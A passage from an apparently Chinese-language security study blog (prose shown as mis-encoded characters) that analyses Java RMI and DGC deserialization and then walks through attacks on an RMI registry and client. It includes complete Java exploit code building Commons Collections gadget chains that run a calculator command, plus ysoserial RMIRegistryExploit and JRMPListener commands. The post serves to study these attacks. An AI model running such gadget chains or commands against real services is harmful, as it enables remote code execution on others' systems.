class="line">                Lease var10;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectInput</span> <span class="variable">var13</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                    var7 = (ObjID[])var13.readObject();</span><br><span class="line">                    var8 = var13.readLong();</span><br><span class="line">                    var10 = (Lease)var13.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">Lease</span> <span class="variable">var11</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var12.writeObject(var11);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¸åŒçš„caseå¯¹åº”ä¸åŒçš„æ–¹æ³•ï¼Œä¸€ä¸ªclean ä¸€ä¸ªdirtyï¼Œå¯ä»¥çœ‹åˆ°éƒ½æ˜¯æœ‰ååºåˆ—åŒ–ç‚¹çš„</p><p>è¿™é‡Œå…¶å®ç®—æ˜¯æ”»å‡»dgcçš„æœåŠ¡ç«¯ã€‚</p><p>çœ‹çœ‹dgc_stubç«¯</p><h4 id="ååºåˆ—åŒ–10"><a href="#ååºåˆ—åŒ–10" class="headerlink" title="ååºåˆ—åŒ–10"></a>ååºåˆ—åŒ–10</h4><p>è¿™é‡Œç›´æ¥è·Ÿç€ç™½æ—¥æ¢¦ç»„é•¿çš„è§†é¢‘çœ‹æºç åˆ†æäº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732259853602-9908d987-caee-4116-8305-158c7898dfe1.png"></p><p>åœ¨stubç«¯çš„cleanæ–¹æ³•é‡Œå­˜åœ¨ç€invokeæ–¹æ³•ï¼Œè¿™é‡Œä¼šè°ƒç”¨execute.callæ–¹æ³•å’Œååºåˆ—åŒ–1å¾ˆåƒï¼Œå°±æ˜¯jrmpæ”»å‡»çš„åŸç†</p><h4 id="ååºåˆ—åŒ–11"><a href="#ååºåˆ—åŒ–11" class="headerlink" title="ååºåˆ—åŒ–11"></a>ååºåˆ—åŒ–11</h4><p>å¾€ä¸‹çœ‹ä»–çš„dirtyæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732260283714-24ffc5eb-de7e-457e-9ea4-803a93155117.png"></p><p>ä¼šååºåˆ—åŒ–ä»dgc_skelä¼ æ¥çš„æ•°æ®</p><h2 id="RMIæ”»å‡»"><a href="#RMIæ”»å‡»" class="headerlink" title="RMIæ”»å‡»"></a>RMIæ”»å‡»</h2><p>å‚è€ƒï¼š<a href="https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF">https://su18.org/post/rmi-attack/#1-%E6%94%BB%E5%87%BB-server-%E7%AB%AF</a></p><p>è¿˜æ˜¯éœ€è¦è®°å½•ä¸‹å‡ ä¸ªrmiæ”»å‡»æ–¹æ³•çš„ã€‚</p><h3 id="æ”»å‡»æ³¨å†Œä¸­å¿ƒ"><a href="#æ”»å‡»æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="æ”»å‡»æ³¨å†Œä¸­å¿ƒ"></a>æ”»å‡»æ³¨å†Œä¸­å¿ƒ</h3><h4 id="æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ"><a href="#æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ"></a>æœåŠ¡ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServerAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">ouputMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(ouputMap, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line">            <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">tmpMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            tmpMap.put(<span class="string">&quot;pwn&quot;</span>, badAttributeValueExpException);</span><br><span class="line">            Constructor&lt;?&gt; ctor = <span class="literal">null</span>;</span><br><span class="line">            ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Override.class, tmpMap);</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(RMIServerAttack.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler));</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">            registry.bind(<span class="string">&quot;hello1&quot;</span>, remote);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹è°ƒç”¨è¿‡ç¨‹å°±å¤§æ¦‚äº†è§£åŸç†äº†ï¼Œå…¶å®åœ¨ä¹‹å‰çš„ååºåˆ—åŒ–6é‚£é‡Œå°±å·²ç»åˆ†æè¿‡äº†ä¸»è¦æ˜¯dispatché‡Œé¢è§¦å‘çš„ååºåˆ—åŒ–ï¼Œè¿™é‡Œå…ˆæ–­ä½</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230635833-a048ee6b-63a2-4cae-a6a1-cbb4ae5c1859.png"></p><p>ç„¶åè·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230646123-2d7c5c0b-d7f8-4c73-9969-cbab8ad9252b.png"></p><p>ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230661770-70b9a88e-20c7-403d-a712-63269212c0d1.png"></p><p>è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230696347-50fdef3a-f84a-4b81-adb1-1bb0f8282fc5.png"></p><p>è¿™é‡Œå°±æ˜¯æœ€ç»ˆçš„æ‰§è¡Œæµç¨‹äº†è¿™é‡Œå› ä¸ºä½¿ç”¨çš„æ˜¯bindæ–¹æ³•æ‰€ä»¥ä¼šè¿›å…¥åˆ°bindå¯¹åº”çš„æ–¹æ³•é‡Œé¢ã€‚</p><p>é‡ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">        Remote.class.getClassLoader(),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br></pre></td></tr></table></figure><p>Remote.class.castè¿™é‡Œå®é™…ä¸Šæ˜¯å°†ä¸€ä¸ªä»£ç†å¯¹è±¡è½¬æ¢ä¸ºäº†Remoteå¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Proxy.newProxyInstance(</span><br><span class="line">    Remote.class.getClassLoader(),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler)</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ä¸­åˆ›å»ºäº†ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œè¿™ä¸ªä»£ç†å¯¹è±¡ä»£ç†äº†Remote.classæ¥å£ï¼Œhandlerä¸ºæˆ‘ä»¬çš„handlerå¯¹è±¡ã€‚å½“è°ƒç”¨è¿™ä¸ªä»£ç†å¯¹è±¡çš„ä¸€åˆ‡æ–¹æ³•æ—¶ï¼Œæœ€ç»ˆéƒ½ä¼šè½¬åˆ°è°ƒç”¨handlerçš„invokeæ–¹æ³•ã€‚</p><p>è€Œhandleræ˜¯InvocationHandlerå¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨InvocationHandlerå¯¹è±¡çš„invokeæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733230791168-9c0d078f-3bbc-4458-a0f4-be1c19df89a9.png"></p><h5 id="è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ysoå·¥å…·è¿›è¡Œæ”»å‡»"><a href="#è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ysoå·¥å…·è¿›è¡Œæ”»å‡»" class="headerlink" title="è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ysoå·¥å…·è¿›è¡Œæ”»å‡»"></a>è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨ysoå·¥å…·è¿›è¡Œæ”»å‡»</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit <span class="number">10.169</span><span class="number">.0</span><span class="number">.90</span> <span class="number">1099</span> CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span></span><br></pre></td></tr></table></figure><p>å…¶å®è¿™é‡Œè‡ªä¹ è·Ÿè¸ªè°ƒç”¨æ ˆä½ ä¼šå‘ç°ä»–ä¼šå…ˆè¿›åˆ°ï¼Œcaseä¸º1çš„é€»è¾‘é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232400419-21e87bdc-c778-407d-a04c-30f391c64dd6.png"></p><p>ç„¶ååœ¨è¿›åˆ°caseä¸º0çš„æƒ…å†µä¸‹è§¦å‘ååºåˆ—åŒ–ã€‚</p><h4 id="å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ"><a href="#å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ"></a>å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map)constructor.newInstance(innermap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class,map); <span class="comment">//åˆ›å»ºç¬¬ä¸€ä¸ªä»£ç†çš„handler</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,map_handler); <span class="comment">//åˆ›å»ºproxyå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line">        <span class="comment">// è·å–ref</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è·å–operations</span></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line">        <span class="comment">// ä¼ªé€ lookupçš„ä»£ç ï¼Œå»ä¼ªé€ ä¼ è¾“ä¿¡æ¯</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(r);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºlookupåªèƒ½ä¼ å‚ä¸ºStringç±»å‹æ‰€ä»¥éœ€è¦ä¼ªé€ lookupçš„æ–¹æ³•è¿›è¡Œè°ƒç”¨</p><p>å…·ä½“çœ‹å›¾</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733232199268-fe991e3e-c19f-4ee2-a71b-bb0f554b30e4.png"></p><p>å¯ä»¥çœ‹åˆ°ä¼šè¿›åˆ°lookupçš„æ–¹æ³•é‡Œã€‚</p><h3 id="æ”»å‡»å®¢æˆ·ç«¯"><a href="#æ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="æ”»å‡»å®¢æˆ·ç«¯"></a>æ”»å‡»å®¢æˆ·ç«¯</h3><h4 id="æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯"><a href="#æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯"></a>æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯</h4><p>ç›´æ¥ä½¿ç”¨å·¥å…· yso</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span>  CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span></span><br></pre></td></tr></table></figure><p>å—å®³ç«¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> 